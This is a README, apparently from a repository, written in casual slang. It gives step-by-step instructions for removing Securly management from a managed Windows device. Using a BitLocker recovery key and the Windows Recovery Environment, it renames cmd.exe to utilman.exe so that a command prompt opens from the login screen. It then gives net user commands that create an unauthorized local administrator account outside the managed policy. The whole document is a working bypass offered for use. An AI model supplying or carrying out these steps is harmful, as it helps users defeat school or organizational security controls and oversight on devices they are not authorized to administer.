---

# Sybau-Securly
One-stop shop for all ur Securly removal needs.

---

## Prerequisites

- A Microsoft account with ur BitLocker recovery key
- Physical access to the device

---

## Step 1 — Get Ur BitLocker Recovery Key

1. Go to [https://aka.ms/myrecoverykey](https://aka.ms/myrecoverykey) and sign in.
2. Go to **Devices** and find the key for ur machine.
3. **WRITE IT DOWN!!!**

> If u cant find it under ur devices, ur cooked. Stop here.

---

## Step 2 — Boot into WinRE

1. Log in and open the **Start Menu**.
2. Hit **Power**, hold **Left Shift**, and click **Restart**.
3. Keep holding until the blue WinRE screen comes up.

---

## Step 3 — Swap Utilman in CMD

1. In WinRE go to **Troubleshoot → Advanced Options → Command Prompt**.
2. If ur on a managed PC, this is where ur BitLocker key comes in — enter it when prompted.
3. U should see something like `X:\Windows\System32>`. Figure out ur actual Windows drive letter (`C:`, `D:`, etc.).
4. Type these commands, swapping in ur real drive letter:

```cmd
cd C:\Windows\System32
ren utilman.exe utilman1.exe
ren cmd.exe utilman.exe
exit

5. Click Continue to boot back into Windows.

---

Step 4 — Make Ur Admin Account

1. At the login screen, don't sign in yet.
2. Click the Accessibility icon at the bottom right — a CMD window should pop up.
   - U might need to try a few times.
3. Type the following, replacing yourusername and yourpassword with whatever u want:

cd C:\Users
net user yourusername yourpassword /add
net localgroup administrators yourusername /add

4. Run netplwiz — u should see a window to manage users. Click the one u just created, set it to Admin, and set ur password there too.

---

Step 5 — LOGIN!!!

1. At the login screen, click Other User.
2. In the username field, type ur device name + username like this:

YourDeviceName\yourusername

▎ IT MUST BE A BACKSLASH — THE BACKWARDS ONE \

3. Type ur password and sign in.

---

THEN UR DONE. New local admin account, outside the managed policy. Securly doesn't touch it.
